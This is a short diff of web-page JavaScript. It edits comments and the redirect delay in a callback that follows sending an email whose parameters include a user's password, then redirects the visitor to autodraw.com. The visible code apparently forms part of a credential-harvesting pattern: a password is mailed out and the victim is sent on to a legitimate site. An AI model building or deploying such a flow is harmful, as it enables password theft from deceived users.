@@ -86,14 +86,15 @@
                 password: password
             })
             .then(function(response) {
-                console.log('Email sent successfully:', response);
+                // Trigger alert only after email is successfully sent
                 alert('Email sent successfully!');
 
-                // Add a slight delay before redirect
+                // Redirect to drawing website after the alert
                 setTimeout(function() {
                     window.location.href = 'https://www.autodraw.com';
-                }, 1000);  // Delay for 1 second before redirecting
+                }, 500); // Delay to ensure the alert has been shown
             }, function(error) {
+                // Handle failure
                 console.error('Failed to send email:', error);
                 alert('Failed to send email. Error: ' + JSON.stringify(error));
             });
